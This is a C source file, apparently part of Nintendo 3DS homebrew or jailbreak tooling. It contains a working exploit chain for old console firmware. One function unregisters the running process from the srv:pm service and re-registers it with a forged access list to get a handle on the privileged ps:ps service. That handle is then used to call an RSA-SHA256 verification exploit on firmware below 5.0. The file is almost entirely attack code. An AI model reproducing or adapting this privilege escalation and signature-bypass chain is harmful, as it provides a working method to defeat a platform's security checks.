#include "exploit.h"
#include "rsa_exploit.h"
#include "svc.h"
#include "srv.h"
#include "srvpm.h"
#include "result.h"
#include "os.h"

static inline void assertSuccess(Result res)
{
    if(R_FAILED(res)) svcBreak(USERBREAK_ASSERT);
}

static void escalateServicePrivileges(Handle *wantedServiceHandle, const char *wantedServiceName)
{
    if(osGetFirmVersion() < SYSTEM_VERSION(2, 39, 4)) // Before 7.0
    {
        char accessList[][8] = {
            "01234567",
            "APT:U",
        };

        strncpy(accessList[0], wantedServiceName, 8);
        u32 pid;
        Handle srvPmHandle, srvHandle;

        assertSuccess(srvPmInit(&srvPmHandle, &srvHandle));
        assertSuccess(svcGetProcessId(&pid, CUR_PROCESS_HANDLE));
        assertSuccess(SRVPM_UnregisterProcess(&srvPmHandle, pid));
        assertSuccess(SRVPM_RegisterProcess(&srvPmHandle, pid, sizeof(accessList)/8, accessList));

        assertSuccess(srvGetServiceHandle(&srvHandle, wantedServiceHandle, wantedServiceName));
    }
    else
        svcBreak(USERBREAK_ASSERT);
}

void doExploit(void)
{
    if(osGetFirmVersion() < SYSTEM_VERSION(2, 35, 6)) // < 5.0
    {
        Handle psHandle;
        escalateServicePrivileges(&psHandle, "ps:ps");
        assertSuccess(PS_VerifyRsaSha256_Exploit(&psHandle));
    }
    else
        svcBreak(USERBREAK_ASSERT);
}
